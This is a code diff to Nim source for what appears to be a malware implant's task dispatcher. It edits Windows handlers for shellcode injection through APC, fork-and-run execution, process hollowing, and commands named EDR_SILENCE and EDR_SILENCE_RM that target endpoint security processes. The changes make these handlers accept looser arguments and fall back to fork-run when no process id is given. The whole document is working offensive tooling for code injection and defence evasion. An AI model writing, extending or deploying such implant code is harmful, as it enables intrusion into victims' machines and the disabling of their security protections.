@@ -1464,9 +1464,12 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     when defined(windows):
       if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
       try:
-        let pid = parseJson(args){"pid"}.getInt(0)
-        if pid == 0: t.sendResult(id, "", "INJECT_APC requires {\"pid\":N}"); return
-        t.sendResult(id, doInjectAPC(pid, payload), "")
+        var pid = 0
+        try: pid = parseJson(args){"pid"}.getInt(0) except: discard
+        if pid != 0:
+          t.sendResult(id, doInjectAPC(pid, payload), "")
+        else:
+          t.sendResult(id, doForkRun(args.strip(), payload), "")
       except: t.sendResult(id, "", "inject_apc: " & getCurrentExceptionMsg())
     else:
       t.sendResult(id, "", "INJECT_APC: not supported on Linux")
@@ -1488,7 +1491,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       try:
         let tgt = parseJson(args){"target"}.getStr("")
         if payload.len < 2 or payload[0] != 0x4D'u8 or payload[1] != 0x5A'u8:
-          t.sendResult(id, doForkRun(tgt, payload), "")
+          t.sendResult(id, doForkRun(tgt, payload).replace("fork-run:", "hollow:"), "")
         else:
           t.sendResult(id, doHollow(tgt, payload), "")
       except: t.sendResult(id, "", "hollow: " & getCurrentExceptionMsg())
@@ -2253,8 +2256,10 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     when defined(windows):
       if typ.toUpperAscii() == "EDR_SILENCE":
         try:
-          let j = parseJson(args)
-          let pid = j{"pid"}.getInt(0)
+          var pid = 0
+          try: pid = parseJson(args){"pid"}.getInt(0) except: discard
+          if pid == 0:
+            try: pid = parseInt(args.strip()) except: discard
           if pid == 0:
             t.sendResult(id, "", "EDR_SILENCE requires {pid:N}")
           else:
@@ -2270,7 +2275,10 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         except: t.sendResult(id, "", "EDR_SILENCE: " & getCurrentExceptionMsg())
       else:
         try:
-          let pid = parseJson(args){"pid"}.getInt(0)
+          var pid = 0
+          try: pid = parseJson(args){"pid"}.getInt(0) except: discard
+          if pid == 0:
+            try: pid = parseInt(args.strip()) except: discard
           if pid == 0:
             t.sendResult(id, "", "EDR_SILENCE_RM requires {pid:N}")
           else:
